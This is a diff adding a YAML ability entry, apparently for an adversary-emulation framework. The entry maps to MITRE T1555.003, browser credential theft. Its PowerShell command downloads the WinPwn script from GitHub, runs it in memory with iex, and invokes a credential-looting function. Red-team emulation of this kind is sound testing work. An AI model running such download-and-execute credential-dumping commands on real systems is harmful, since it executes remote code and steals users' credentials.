@@ -1,0 +1,19 @@
+---
+- id: fcb48dc9d0878aada8977dbaa540fdfb
+  name: WinPwn - Loot local Credentials - mimi-kittenz
+  description: Loot local Credentials - mimi-kittenz technique via function of WinPwn
+    - Extend timeout to 600s
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          kittenz -consoleoutput -noninteractive
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
